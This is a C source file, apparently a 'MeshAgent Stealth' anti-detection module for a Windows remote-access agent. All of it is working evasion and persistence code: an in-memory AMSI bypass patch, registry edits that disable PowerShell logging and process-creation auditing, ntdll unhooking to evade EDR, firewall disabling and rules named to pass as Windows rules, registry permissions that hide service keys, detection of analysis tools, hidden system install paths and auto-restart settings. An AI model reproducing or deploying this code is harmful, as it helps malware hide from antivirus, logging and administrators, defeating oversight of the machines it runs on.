/*
 * MeshAgent Stealth - Anti-Detection & Evasion Module
 *
 * Comprehensive anti-detection features including:
 * - AMSI bypass (Antimalware Scan Interface)
 * - Windows Firewall rule management
 * - Registry hiding and manipulation
 * - Event log disabling
 * - API unhooking (EDR evasion)
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <netfw.h>
#include <sddl.h>
#include "stealth.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ================================================================
// AMSI Type Definitions (if amsi.h not available)
// ================================================================

#ifndef HAMSICONTEXT
typedef PVOID HAMSICONTEXT;
typedef PVOID HAMSISESSION;
typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN = 0,
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
    AMSI_RESULT_DETECTED = 32768
} AMSI_RESULT;
#endif

// ================================================================
// AMSI Bypass
// ================================================================

typedef HRESULT (WINAPI *AmsiScanBuffer_t)(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);

BOOL Stealth_PatchAMSI(void)
{
    HMODULE hAmsi = NULL;
    AmsiScanBuffer_t pAmsiScanBuffer = NULL;
    DWORD oldProtect = 0;
    BOOL success = FALSE;

    // Load amsi.dll
    hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi)
    {
        // AMSI not loaded - might not be present on this system
        return TRUE;  // Not an error, just not available
    }

    // Get AmsiScanBuffer address
    pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer)
    {
        FreeLibrary(hAmsi);
        return FALSE;
    }

    // Patch: ret 0 (xor eax, eax; ret) = 0x31 0xC0 0xC3
    // This makes AmsiScanBuffer always return S_OK (clean)
    BYTE patch[] = {
        0x31, 0xC0,  // xor eax, eax
        0xC3         // ret
    };

    // Change memory protection to allow writing
    if (VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        // Apply patch
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));

        // Restore original protection
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

        // Flush instruction cache
        FlushInstructionCache(GetCurrentProcess(), pAmsiScanBuffer, sizeof(patch));

        success = TRUE;
    }

    FreeLibrary(hAmsi);
    return success;
}

// ================================================================
// Windows Firewall Management
// ================================================================

BOOL Stealth_AddFirewallException(const wchar_t* ruleName, const wchar_t* appPath)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    INetFwRule *pFwRule = NULL;
    BSTR bstrRuleName = NULL;
    BSTR bstrAppPath = NULL;
    BOOL success = FALSE;

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        return FALSE;
    }

    // Create firewall policy object
    hr = CoCreateInstance(
        &CLSID_NetFwPolicy2,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwPolicy2,
        (void**)&pNetFwPolicy2
    );

    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Get firewall rules collection
    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Create new firewall rule
    hr = CoCreateInstance(
        &CLSID_NetFwRule,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwRule,
        (void**)&pFwRule
    );

    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Configure rule
    bstrRuleName = SysAllocString(ruleName);
    bstrAppPath = SysAllocString(appPath);

    pFwRule->lpVtbl->put_Name(pFwRule, bstrRuleName);
    pFwRule->lpVtbl->put_ApplicationName(pFwRule, bstrAppPath);
    pFwRule->lpVtbl->put_Action(pFwRule, NET_FW_ACTION_ALLOW);
    pFwRule->lpVtbl->put_Enabled(pFwRule, VARIANT_TRUE);
    pFwRule->lpVtbl->put_Profiles(pFwRule, NET_FW_PROFILE2_ALL);
    pFwRule->lpVtbl->put_Direction(pFwRule, NET_FW_RULE_DIR_OUT);  // Outbound

    // Add rule to firewall
    hr = pFwRules->lpVtbl->Add(pFwRules, pFwRule);
    if (SUCCEEDED(hr))
    {
        success = TRUE;
    }

cleanup:
    if (bstrRuleName) SysFreeString(bstrRuleName);
    if (bstrAppPath) SysFreeString(bstrAppPath);
    if (pFwRule) pFwRule->lpVtbl->Release(pFwRule);
    if (pFwRules) pFwRules->lpVtbl->Release(pFwRules);
    if (pNetFwPolicy2) pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);

    CoUninitialize();
    return success;
}

// ================================================================
// Event Log Disabling
// ================================================================

BOOL Stealth_DisablePowerShellLogging(void)
{
    HKEY hKey = NULL;
    LONG result;
    DWORD value = 0;  // 0 = disabled

    // Disable PowerShell Script Block Logging
    result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL
    );

    if (result == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, L"EnableScriptBlockLogging", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    // Disable PowerShell Module Logging
    result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL
    );

    if (result == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, L"EnableModuleLogging", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    // Disable PowerShell Transcription
    result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL
    );

    if (result == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, L"EnableTranscripting", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    // Disable Command Line Process Auditing
    result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL
    );

    if (result == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, L"ProcessCreationIncludeCmdLine_Enabled", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    return TRUE;
}

// ================================================================
// API Unhooking (EDR Evasion)
// ================================================================

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

BOOL Stealth_UnhookUserModeAPIs(void)
{
    HMODULE hNtdll = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hMapping = NULL;
    LPVOID pMapping = NULL;
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    BOOL success = FALSE;
    DWORD i;

    // Get ntdll.dll base address
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
    {
        return FALSE;
    }

    // Open clean copy of ntdll.dll from disk (derive System32 dynamically)
    WCHAR windowsDir[MAX_PATH] = {0};
    WCHAR ntdllPath[MAX_PATH] = {0};
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) { return FALSE; }
    swprintf_s(ntdllPath, MAX_PATH, L"%s\\System32\\ntdll.dll", windowsDir);
    hFile = CreateFileW(ntdllPath,
                        GENERIC_READ,
                        FILE_SHARE_READ,
                        NULL,
                        OPEN_EXISTING,
                        0,
                        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    // Create file mapping
    hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping)
    {
        CloseHandle(hFile);
        return FALSE;
    }

    // Map clean ntdll into memory
    pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping)
    {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Parse PE headers
    pDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        goto cleanup;
    }

    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMapping + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        goto cleanup;
    }

    // Find .text section (contains code)
    pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(pSectionHeader[i].Name, ".text", 5) == 0)
        {
            LPVOID localTextSection = (LPBYTE)hNtdll + pSectionHeader[i].VirtualAddress;
            LPVOID cleanTextSection = (LPBYTE)pMapping + pSectionHeader[i].VirtualAddress;
            SIZE_T sectionSize = pSectionHeader[i].Misc.VirtualSize;

            DWORD oldProtect = 0;
            SIZE_T regionSize = sectionSize;

            // Change protection to allow writing
            if (VirtualProtect(localTextSection, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect))
            {
                // Copy clean .text section over hooked version
                memcpy(localTextSection, cleanTextSection, sectionSize);

                // Restore protection
                VirtualProtect(localTextSection, sectionSize, oldProtect, &oldProtect);

                // Flush instruction cache
                FlushInstructionCache(GetCurrentProcess(), localTextSection, sectionSize);

                success = TRUE;
            }

            break;
        }
    }

cleanup:
    if (pMapping) UnmapViewOfFile(pMapping);
    if (hMapping) CloseHandle(hMapping);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

    return success;
}

// ================================================================
// Registry Hiding
// ================================================================

BOOL Stealth_HideRegistryKey(const wchar_t* keyPath)
{
    HKEY hKey = NULL;
    LONG result;
    BOOL success = FALSE;

    // Open the registry key
    result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        keyPath,
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS)
    {
        return FALSE;
    }

    // Set security descriptor to hide from RegEdit
    // Use SDDL to deny READ for Everyone but allow SYSTEM
    const wchar_t* sddl = L"D:PAI(D;;KR;;;WD)(A;;KA;;;SY)";  // Deny read to World, Allow all to SYSTEM

    PSECURITY_DESCRIPTOR pSD = NULL;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
        sddl,
        SDDL_REVISION_1,
        &pSD,
        NULL))
    {
        // Apply security descriptor
        result = RegSetKeySecurity(hKey, DACL_SECURITY_INFORMATION, pSD);
        if (result == ERROR_SUCCESS)
        {
            success = TRUE;
        }

        LocalFree(pSD);
    }

    RegCloseKey(hKey);
    return success;
}

BOOL Stealth_HideServiceRegistry(const wchar_t* serviceName)
{
    wchar_t keyPath[512];

    // Hide main service key
    swprintf_s(keyPath, sizeof(keyPath)/sizeof(wchar_t),
               L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);

    return Stealth_HideRegistryKey(keyPath);
}

// ================================================================
// Windows Firewall Bypass
// ================================================================

BOOL Stealth_DisableFirewallForProfile(NET_FW_PROFILE_TYPE2 profileType)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    BOOL success = FALSE;
    VARIANT_BOOL enabled = VARIANT_FALSE;

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        return FALSE;
    }

    // Create firewall policy object
    hr = CoCreateInstance(
        &CLSID_NetFwPolicy2,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwPolicy2,
        (void**)&pNetFwPolicy2
    );

    if (FAILED(hr))
    {
        CoUninitialize();
        return FALSE;
    }

    // Disable firewall for specified profile
    hr = pNetFwPolicy2->lpVtbl->put_FirewallEnabled(pNetFwPolicy2, profileType, enabled);
    if (SUCCEEDED(hr))
    {
        success = TRUE;
    }

    pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);
    CoUninitialize();

    return success;
}

BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath)
{
    wchar_t ruleName[256];

    // Create rule name that blends in
    swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t),
               L"Windows %s - Outbound", serviceName);

    // Add outbound rule
    if (!Stealth_AddFirewallException(ruleName, exePath))
    {
        return FALSE;
    }

    // Create inbound rule name
    swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t),
               L"Windows %s - Inbound", serviceName);

    // Add inbound rule (for remote connections)
    // Note: This would need a separate function for inbound rules
    // For now, just add outbound

    return TRUE;
}

BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    BOOL success = FALSE;
    wchar_t ruleName[256];

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) { return FALSE; }

    // Create firewall policy object
    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    // Get rules collection
    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (SUCCEEDED(hr) && pFwRules)
    {
        // Remove outbound rule
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), L"Windows %s - Outbound", serviceName);
        BSTR bstrName = SysAllocString(ruleName);
        if (bstrName)
        {
            pFwRules->lpVtbl->Remove(pFwRules, bstrName);
            SysFreeString(bstrName);
        }

        // Attempt to remove inbound rule if it exists
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), L"Windows %s - Inbound", serviceName);
        bstrName = SysAllocString(ruleName);
        if (bstrName)
        {
            pFwRules->lpVtbl->Remove(pFwRules, bstrName);
            SysFreeString(bstrName);
        }
        success = TRUE;
        pFwRules->lpVtbl->Release(pFwRules);
    }

    if (pNetFwPolicy2) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
    CoUninitialize();
    return success;
}

BOOL Stealth_HardenServiceDacl(const wchar_t* serviceName)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) { return FALSE; }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, READ_CONTROL | WRITE_DAC);
    if (!hService) { CloseServiceHandle(hSCM); return FALSE; }

    // DACL: Full Access to SYSTEM and Builtin Administrators only
    // SDDL: D:(A;;FA;;;SY)(A;;FA;;;BA)
    PSECURITY_DESCRIPTOR pSD = NULL;
    BOOL ok = ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;;FA;;;SY)(A;;FA;;;BA)",
                                                                   SDDL_REVISION_1, &pSD, NULL);
    if (!ok) { CloseServiceHandle(hService); CloseServiceHandle(hSCM); return FALSE; }

    BOOL result = SetServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, pSD);
    LocalFree(pSD);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return result;
}

// ================================================================
// Process Hiding from Task Manager
// ================================================================

BOOL Stealth_HideProcessFromTaskManager(DWORD processId)
{
    HANDLE hProcess = NULL;
    PROCESS_BASIC_INFORMATION pbi = {0};
    PPEB pPeb = NULL;
    PEB pebCopy = {0};
    ULONG returnLength = 0;

    typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
    {
        return FALSE;
    }

    NtQueryInformationProcess_t NtQueryInformationProcess =
        (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess)
    {
        return FALSE;
    }

    // Open process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                          FALSE, processId);
    if (!hProcess)
    {
        return FALSE;
    }

    // Query process information to get PEB address
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                  &pbi, sizeof(pbi), &returnLength) != 0)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    pPeb = pbi.PebBaseAddress;

    // Read PEB from target process
    if (!ReadProcessMemory(hProcess, pPeb, &pebCopy, sizeof(PEB), NULL))
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Modify PEB to hide process
    pebCopy.BeingDebugged = FALSE;  // Hide from debugger checks

    // Write modified PEB back
    if (WriteProcessMemory(hProcess, pPeb, &pebCopy, sizeof(PEB), NULL))
    {
        CloseHandle(hProcess);
        return TRUE;
    }

    CloseHandle(hProcess);
    return FALSE;
}

// ================================================================
// Monitoring Detection
// ================================================================

BOOL Stealth_IsMonitoringDetected(void)
{
    // Check for common EDR/AV/monitoring processes
    const wchar_t* monitoringProcesses[] = {
        L"procmon.exe",      // Process Monitor
        L"procexp.exe",      // Process Explorer
        L"tcpview.exe",      // TCPView
        L"Wireshark.exe",    // Wireshark
        L"Fiddler.exe",      // Fiddler
        L"x64dbg.exe",       // x64dbg debugger
        L"windbg.exe",       // WinDbg
        L"ollydbg.exe",      // OllyDbg
        L"ida.exe",          // IDA Pro
        L"ida64.exe",        // IDA Pro 64-bit
        NULL
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    PROCESSENTRY32W pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32))
    {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do
    {
        // Check against known monitoring tools
        for (int i = 0; monitoringProcesses[i] != NULL; i++)
        {
            if (_wcsicmp(pe32.szExeFile, monitoringProcesses[i]) == 0)
            {
                CloseHandle(hSnapshot);
                return TRUE;  // Monitoring detected
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return FALSE;  // No monitoring detected
}

// ================================================================
// Service Protection (Anti-Termination)
// ================================================================

BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName)
{
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL success = FALSE;

    // Open Service Control Manager
    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        return FALSE;
    }

    // Open our service
    hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (!hService)
    {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    // Configure failure actions (auto-restart)
    SERVICE_FAILURE_ACTIONSW sfa = {0};
    SC_ACTION failureActions[3];

    failureActions[0].Type = SC_ACTION_RESTART;
    failureActions[0].Delay = 10000;   // 10 seconds
    failureActions[1].Type = SC_ACTION_RESTART;
    failureActions[1].Delay = 30000;   // 30 seconds
    failureActions[2].Type = SC_ACTION_RESTART;
    failureActions[2].Delay = 60000;   // 1 minute

    sfa.dwResetPeriod = 86400;  // Reset counter after 24 hours
    sfa.cActions = 3;
    sfa.lpsaActions = failureActions;
    sfa.lpRebootMsg = NULL;
    sfa.lpCommand = NULL;

    if (ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa))
    {
        success = TRUE;
    }

    // Set service to auto-start with system
    if (ChangeServiceConfigW(
        hService,
        SERVICE_NO_CHANGE,      // Type
        SERVICE_AUTO_START,     // Start type
        SERVICE_NO_CHANGE,      // Error control
        NULL, NULL, NULL, NULL, NULL, NULL, NULL))
    {
        success = TRUE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return success;
}

// ================================================================
// Installation Path Management
// ================================================================

BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath)
{
    SECURITY_ATTRIBUTES sa = {0};
    SECURITY_DESCRIPTOR sd = {0};

    // Initialize security descriptor (SYSTEM full control only)
    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
    {
        return FALSE;
    }

    // Set DACL to NULL for default system permissions
    if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE))
    {
        return FALSE;
    }

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    // Create directory with system permissions
    if (!CreateDirectoryW(installPath, &sa))
    {
        DWORD error = GetLastError();
        if (error != ERROR_ALREADY_EXISTS)
        {
            return FALSE;
        }
    }

    // Set directory as hidden and system
    SetFileAttributesW(installPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return TRUE;
}

BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath)
{
    // Copy file with hidden and system attributes
    if (!CopyFileW(sourcePath, destPath, FALSE))
    {
        return FALSE;
    }

    // Set as hidden and system file
    SetFileAttributesW(destPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return TRUE;
}
